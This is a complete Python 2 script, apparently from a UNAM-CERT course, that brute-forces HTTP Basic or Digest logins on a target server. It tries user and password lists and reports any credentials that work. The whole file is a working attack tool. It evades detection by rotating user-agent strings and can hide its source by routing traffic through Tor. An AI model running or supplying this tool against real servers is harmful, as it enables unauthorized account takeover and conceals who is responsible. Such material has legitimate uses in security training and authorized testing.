#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT

# Se necesita correr pip2 install requests requests[socks] [--upgrade]

import sys
import optparse
import requests
from requests import get
from requests.exceptions import ConnectionError
from requests.auth import HTTPDigestAuth

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0"
]

def printError(msg, exit = False):
    sys.stderr.write('Error:\t%s\n' % msg)
    if exit:
        sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=False, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported, if not specified, results will default to standad output. In combination with -o, it will also print results to standard output.')
    parser.add_option('-o','--std-out', dest='stdout', default=False, action='store_true', help='If specified, results will be printed to standard output. This is the default behaviour, unless -r is specified, then -o needs to be set to print results to standard output.')
    parser.add_option('-u', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-w', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-U', '--user-list', dest='user_list', default=None, help='List of users that will be tested during the attack.')
    parser.add_option('-W', '--password-list', dest='password_list', default=None, help='List of passwords that will be tested during the attack.')
    parser.add_option('-t','--tls', dest='tls', default=False, action='store_true', help='If specified, HTTPS protocol will be used instead of default HTTP.')
    parser.add_option('-d','--digest', dest='digest', default=False, action='store_true', help='If specified, digest authentication will be used instead of default basic authentication.')
    parser.add_option('-T','--tor', dest='tor', default=False, action='store_true', help='If specified, requests will be done over TOR.')
    parser.add_option('-a','--change-user-agent', type="int", dest='useragent', default=5, help='Number of requests after which user agent will be changed.')
    opts, args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)
    if not options.password and not options.password_list:
        printError('Especificar una contraseña o una lista de contraseñas a probar.', True)
    if not options.user and not options.user_list:
        printError('Especificar un usuario o una lista de usuarios a probar.', True)
    if options.password and options.password_list:
        printError('Especificar sólamente una contraseña o una lista de contraseñas.', True)
    if options.user and options.user_list:
        printError('Especificar sólamente un usuario o una lista de usuarios.', True)
    if options.useragent <= 0:
        printError('Especificar un entero mayor a cero para el número de requests tras el cual se cambia el agente de usuario.', True)

def reportResults(resultados, archivo, stdout):
    if not archivo or (archivo and stdout):
        print resultados
    if archivo:
        with open(archivo, "w") as f:
            f.write(resultados)

def buildURL(server, port, protocol='http', tls=False):
    if opts.tls:
        protocol = 'https'
    url = '%s://%s:%s' % (protocol, server, port)
    return url

def makeRequest(host, user, password, verboso, digest, user_agent, tor):
    try:
        headers = {'User-Agent': user_agent}
        auth = HTTPDigestAuth(user, password) if digest else (user, password)
        response = None
        if tor:
            session = requests.session()
            session.proxies = {'http':  'socks5://127.0.0.1:9050',
                               'https': 'socks5://127.0.0.1:9050'}
            response = session.get(host, auth=auth, headers=headers)
        else:
            response = get(host, auth=auth, headers=headers)
        if verboso:
            print "Agente de usuario: %s" % user_agent
            print "Usuario: %s, Contraseña: %s, Respuesta: %s" % (user, password, str(response))
        if response.status_code == 200:
            return True
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)
    return False

def lista_archivo(archivo):
    try:
        f = open(archivo)
        l = f.readlines()
        f.close()
    except IOError:
        printError('No se puede abrir el archivo %s.' % archivo, True)
    return [x[:-1] for x in l]

def get_passwords(password, password_list):
    if password:
        return [password]
    return lista_archivo(password_list)

def get_users(user, user_list):
    if user:
        return [user]
    return lista_archivo(user_list)

if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        url = buildURL(opts.server, port=opts.port, tls=opts.tls)
        usuarios = get_users(opts.user, opts.user_list)
        passwords = get_passwords(opts.password, opts.password_list)
        tipo = "Digest" if opts.digest else "Basic"
        s = ["URL destino: %s" % url,
             "Tipo de autenticación: %s" % tipo,
             "Usando conexión a través de TOR: %s" % opts.tor
        ]
        if opts.verbose:
            print "\n".join(s)
            if opts.tor:
                print "Usando conexión a través de TOR"
        ua = 0
        i = 1
        for u in usuarios:
            for p in passwords:
                if i % opts.useragent == 0:
                    ua = (ua + 1) % len(user_agents)
                i += 1
                if makeRequest(url, u, p, opts.verbose, opts.digest, user_agents[ua], opts.tor):
                    s.append('CREDENCIALES ENCONTRADAS!: %s\t%s' % (u,p))
                    if opts.verbose:
                        print s[-1]
        if len(s) == 3:
            s.append("No se encontró nada")
        reportResults('\n'.join(s), opts.report, opts.stdout)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
